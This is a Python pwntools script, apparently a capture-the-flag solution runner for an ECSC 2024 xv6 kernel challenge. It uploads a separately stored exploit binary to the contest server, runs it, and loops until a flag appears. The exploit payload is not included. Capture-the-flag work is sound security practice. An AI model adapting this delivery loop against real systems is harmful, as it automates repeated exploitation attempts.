#!/usr/bin/env python3
#
# @mebeim - 2024-04-08
#

import os
from base64 import b64encode
from pathlib import Path
from re import compile
from typing import Union

os.environ['PWNLIB_NOTERM'] = '1'
from pwn import context, log, remote
from pwnlib.log import Progress


HOST = os.getenv('HOST', 'xv6homework.challs.open.ecsc2024.it')
PORT = int(os.getenv('PORT', 38016))


def wait_for_success(r: remote, p: Progress) -> Union[bytes,None]:
	flag_exp = compile(rb'\w+\{[^}]+\}')

	try:
		while 1:
			line = r.recvline(keepends=False, timeout=3)
			if not line:
				p.failure('timed out')
				return None

			if b'usertrap' in line:
				p.failure('user trap')
				return None

			if b'panic' in line:
				p.failure('kernel panic')
				return None

			if any(x in line for x in (b'scause', b'sepc=', b'stval=')):
				p.failure('user or kernel trap: ' + line.decode())
				return None

			if b'failed' in line:
				p.failure(line.decode())
				return None

			match = flag_exp.search(line)
			if match:
				p.success('SUCCESS')
				return match.group().strip()
	except EOFError:
		p.failure('EOFError')
		return False


def run(b64exe: bytes) -> bool:
	with context.local(log_level='error'):
		r = remote(HOST, PORT)

		line = r.recvline()
		if b'do hashcash' in line.lower():
			r.sendlineafter(b'Result: ', b'redacted')
		else:
			r.unrecv(line)

	with log.progress('Running exploit') as p:
		p.status('...')

		r.recvuntil(b'done.\n')
		r.sendline(b64exe)
		r.sendline(b'EOF')
		r.sendlineafter(b'$ ', b'exe')

		flag = wait_for_success(r, p)
		with context.local(log_level='error'):
			r.close()

		if flag:
			print(flag.decode())
			return True

	return False


if __name__ == '__main__':
	with (Path(__file__).parent / 'expl').open('rb') as f:
		expl = b64encode(f.read())

	while not run(expl):
		pass
